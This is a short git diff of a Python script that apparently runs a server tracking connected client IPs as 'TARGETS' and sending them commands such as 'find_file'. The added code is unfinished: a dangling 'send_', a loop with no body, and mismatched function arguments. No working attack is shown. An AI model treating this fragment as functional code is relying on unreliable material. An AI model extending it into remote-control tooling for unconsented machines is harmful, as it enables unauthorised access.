@@ -10,6 +10,8 @@ from concurrent.futures import ThreadPoolExecutor
 
 
 def init_Sandbox():
+    command = 'find_file'
+    send_
 
 
 def connect_client():
@@ -28,7 +30,6 @@ def connect_client():
             TARGETS.append(tar)
             print(f"{str(ip)} Has been Connected ")
         except:
-
             pass
 
 
@@ -58,5 +59,4 @@ while True:
     elif len(IPS) == 1:
         init_Sandbox(CLIENTS[0], IPS[0])
     elif len(IPS) > 1:
-        with ThreadPoolExecutor(max_workers=5) as executor:
-            executor.map(init_Sandbox, TARGETS)
+        for n in TARGETS:
